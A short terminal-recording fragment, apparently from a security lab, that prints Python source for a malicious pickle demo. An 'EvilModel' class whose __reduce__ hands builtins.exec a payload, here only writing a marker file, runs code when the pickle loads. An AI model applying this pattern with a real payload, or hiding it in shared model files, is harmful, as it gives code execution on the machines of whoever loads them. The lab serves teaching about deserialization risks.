[13.313144, "o", "\r\n\u001b[?2004l\r"]
[13.315078, "o", "_PAYLOAD = (\r\n    \"import os;\"\r\n    f\"os.makedirs(r'{STATE}', exist_ok=True);\"\r\n    f\"open(r'{MARKER}', 'w').write(\"\r\n    \"'LAB MARKER: loading this pickle executed code. This is a harmless lab placeholder, \"\r\n    \"not real malware. Delete me with: make clean')\"\r\n)\r\n\r\n\r\nclass EvilModel:\r\n    \"\"\"Looks like a model object. The danger is in __reduce__, which pickle calls on load.\"\"\"\r\n\r\n    def __reduce__(self):\r\n"]
[13.315227, "o", "        # pickle will call builtins.exec(_PAYLOAD) while unpickling. That is the whole trick:\r\n        # the pickle format is allowed to say \"call this function with these arguments\".\r\n"]
[13.315288, "o", "        return (builtins.exec, (_PAYLOAD,))\r\n"]
